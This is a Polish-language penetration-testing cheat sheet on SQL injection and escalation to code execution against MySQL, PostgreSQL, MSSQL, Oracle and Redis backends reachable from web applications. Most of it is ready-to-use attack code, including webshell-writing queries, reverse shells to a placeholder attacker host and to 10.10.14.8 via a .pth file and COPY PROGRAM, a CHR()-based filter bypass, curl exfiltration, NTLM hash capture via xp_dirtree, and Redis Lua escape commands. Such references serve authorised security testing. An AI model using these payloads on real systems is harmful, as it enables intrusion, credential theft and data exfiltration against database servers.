# Bazy danych - SQL Injection i RCE z poziomu aplikacji webowej

> Techniki wstrzykiwania i eskalacji gdy aplikacja webowa laczy sie z backendem SQL/NoSQL.

---

## 1. MySQL / MariaDB (port 3306)

### SQL Injection - podstawowe payloady
```sql
-- Union-based
' UNION SELECT 1,2,3,4,group_concat(0x7c,table_name,0x7c) FROM information_schema.tables-- -
' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_name='users'-- -

-- Odczyt plikow (wymaga FILE privilege)
' UNION SELECT 1,2,load_file('/etc/passwd'),4-- -

-- Zapis webshella (wymaga FILE privilege + znajomosc sciezki webroot)
' UNION SELECT 1,2,"<?php echo shell_exec($_GET['c']);?>",4 INTO OUTFILE '/var/www/html/shell.php'-- -
```

### INTO OUTFILE -> Python .pth RCE
Jesli MySQL ma uprawnienia do zapisu i na serwerze dziala Python (np. CGI):
```sql
' UNION SELECT token FROM users INTO OUTFILE '../../lib/python3.10/site-packages/evil.pth'-- -
```
Zawartosc `.pth` (jedna linia):
```python
import os;os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")
```
Wywolanie: `GET /cgi-bin/dowolny.py` -> automatyczny import `.pth` -> reverse shell.

### Rogue MySQL Server (atak na klienta JDBC)
- Narzedzia: `mysql-fake-server`, `rogue_mysql_server`
- Jesli aplikacja laczy sie z kontrolowanym przez atakujacego serwerem MySQL:
  - `allowLoadLocalInfile=true` -> odczyt dowolnych plikow
  - `autoDeserialize=true` -> deserializacja Java -> RCE

### JDBC `propertiesTransform` RCE (CVE-2023-21971)
```
jdbc:mysql://<attacker>:3306/test?propertiesTransform=com.evil.Evil
```
- Connector/J <= 8.0.32, pre-auth, nie wymaga poprawnych danych logowania.

### Domyslne dane / brak hasla
- `mysql -u root` (bez hasla) - czeste w srodowiskach deweloperskich/Docker.
- Plik `/etc/mysql/debian.cnf` - plaintext haslo `debian-sys-maint`.

---

## 2. PostgreSQL (port 5432/5433)

### SQL Injection -> RCE przez COPY PROGRAM
```sql
-- Wymaga superuser lub pg_execute_server_program
'; COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER/?f=`id|base64`'-- -

-- Pelny reverse shell
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';-- -
```

### Bypass WAF - dynamiczne budowanie COPY PROGRAM
```sql
DO $$
DECLARE cmd text;
BEGIN
  cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
  EXECUTE cmd;
END $$;
```
- `CHR(67)` = 'C' - omija filtrowanie slowa `COPY`.

### Skanowanie portow przez dblink
```sql
SELECT * FROM dblink_connect('host=INTERNAL_IP port=22 user=x password=x dbname=x connect_timeout=3');
```
- Rozne komunikaty bledow = rozne stany portu (otwarty/zamkniety/filtrowany).
- Idealny wektor **SSRF** przez PostgreSQL z poziomu SQLi.

### Odczyt/zapis plikow
```sql
-- Odczyt (wymaga pg_read_server_files lub superuser)
CREATE TABLE tmp(t text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;

-- Zapis
COPY (SELECT convert_from(decode('BASE64_PAYLOAD','base64'),'utf-8')) TO '/var/www/html/shell.php';
```

### RCE przez konfiguracje PostgreSQL
1. **ssl_passphrase_command** - nadpisanie pliku konfiguracji + `pg_reload_conf()`
2. **archive_command** - wstrzykniecie komendy + `pg_switch_wal()`
3. **session_preload_libraries** - zaladowanie zloslywej biblioteki .so

### Wazne grupy PostgreSQL
- `pg_execute_server_program` - wykonywanie komend OS
- `pg_read_server_files` - odczyt dowolnych plikow
- `pg_write_server_files` - zapis dowolnych plikow
- Eskalacja przez `CREATEROLE`: `GRANT pg_execute_server_program TO username;`

---

## 3. MSSQL / Microsoft SQL Server (port 1433)

### xp_cmdshell -> RCE
```sql
-- Wlaczenie xp_cmdshell (wymaga sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Wykonanie komendy
EXEC master..xp_cmdshell 'whoami'

-- Bypass filtrowania "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'whoami'--
```

### Webshell przez Ole Automation
```sql
DECLARE @OLE INT, @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

### Odczyt plikow
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-- SQLi: id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```

### Kradzież hasha NetNTLM (SSRF wewnetrzny)
```sql
EXEC master..xp_dirtree '\\ATTACKER_IP\share'
EXEC master..xp_fileexist '\\ATTACKER_IP\share'
```
- Przechwycenie hasha NTLMv2 przez Responder/Impacket.
- Mozliwy relay attack lub offline cracking.

### Eskalacja: db_owner -> sysadmin
- Jesli baza jest `TRUSTWORTHY` i wlascicielem jest `sa`:
```sql
-- Sprawdzenie
SELECT a.name, b.is_trustworthy_on FROM master..sysdatabases AS a
INNER JOIN sys.databases AS b ON a.name=b.name;
```

### Linked Servers (pivoting)
```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
-- Wykonanie komendy na linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

### Wykonywanie skryptow Python/R
```sql
EXECUTE sp_execute_external_script @language=N'Python',
  @script=N'print(__import__("os").system("whoami"))'
```

### DBaaS (np. AWS RDS)
- `xp_cmdshell` i `TRUSTWORTHY` **nie sa dostepne** w srodowiskach DBaaS.
- Fokus na: SQLi logiczny, exfiltracja danych, linked servers, SSRF do metadanych AWS.

---

## 4. Oracle (port 1521-1529)

### Kluczowe kroki pentestowe
1. Enumeracja wersji TNS Listener
2. Brute-force nazw SID: `odat sidguesser -s <IP>`
3. Brute-force danych logowania
4. Wykonanie kodu (jesli uzyskano dostep)

### Narzedzia
- **ODAT**: `./odat all -s <IP>` - kompleksowa enumeracja
- Nmap: `nmap --script oracle-tns-version -p 1521 <IP>`

### Typowe wektory z poziomu webaplikacji
- SQL injection w PL/SQL (stacked queries, OUT params)
- `UTL_HTTP.REQUEST` / `UTL_TCP` -> SSRF z bazy Oracle
- `DBMS_SCHEDULER` -> wykonanie komend OS

---

## 5. Redis - dodatkowe techniki injection

### SSRF + CRLF -> Redis command injection
Jesli aplikacja webowa ma podatnosc SSRF i mozesz wstrzyknac CRLF:
```
http://vuln-app/fetch?url=http://127.0.0.1:6379/%0D%0ASET%20pwned%20true%0D%0A
```

### Lua sandbox escape (CVE-2022-0543, CVE-2025-49844/46817/46818)
- Redis < 8.2.2 / 8.0.4 / 7.4.6 / 7.2.11 / 6.2.20
- Ucieczka z sandboxa Lua przez EVAL -> RCE na serwerze
```bash
redis-cli EVAL "return unpack({'a','b','c'}, -1, 2147483647)" 0  # DoS/crash (CVE-2025-46817)
```

### Cross-user privilege escalation przez metatables (CVE-2025-46818)
```bash
redis-cli EVAL "getmetatable('').__index = function(_, key)
  if key == 'exec' then return function() return os.execute('id') end end
end; return ('x').exec()" 0
```

---

## 6. Wskazowki ogolne - SSRF do wewnetrznych baz danych

### Typowe porty do skanowania przez SSRF
| Usluga       | Port  | Protokol | Uwagi                              |
|--------------|-------|----------|-------------------------------------|
| Redis        | 6379  | Tekst    | Komendy przez HTTP/CRLF             |
| Memcached    | 11211 | Tekst    | Odczyt/zapis kluczy cache           |
| MongoDB      | 27017 | Binarny  | MongoBleed (CVE-2025-14847) pre-auth|
| CouchDB      | 5984  | HTTP     | Pelne REST API                      |
| MSSQL        | 1433  | Binarny  | xp_dirtree -> NTLM relay           |
| PostgreSQL   | 5432  | Binarny  | dblink -> skanowanie portow         |
| MySQL        | 3306  | Binarny  | Rogue server attacks                |
| RabbitMQ Mgmt| 15672 | HTTP     | guest:guest, API publish            |
| HSQLDB       | 9001  | JDBC     | sa:(puste), Java routines -> RCE    |
| Cassandra    | 9042  | Binarny  | Czesto bez auth                     |
| Redshift     | 5439  | PG-wire  | SQLi w sterownikach klienckich      |

### Ogolna strategia
1. **Rozpoznanie** - zidentyfikuj backend DB (komunikaty bledow, naglowki, porty)
2. **SSRF** - przetestuj dostep do wewnetrznych portow DB z poziomu aplikacji
3. **Injection** - dopasuj payloady SQLi/NoSQLi do konkretnego backendu
4. **Eskalacja** - wykorzystaj specyficzne funkcje DB (xp_cmdshell, COPY PROGRAM, INTO OUTFILE)
5. **Exfiltracja** - DNS, HTTP out-of-band, error-based w zaleznosci od kontekstu
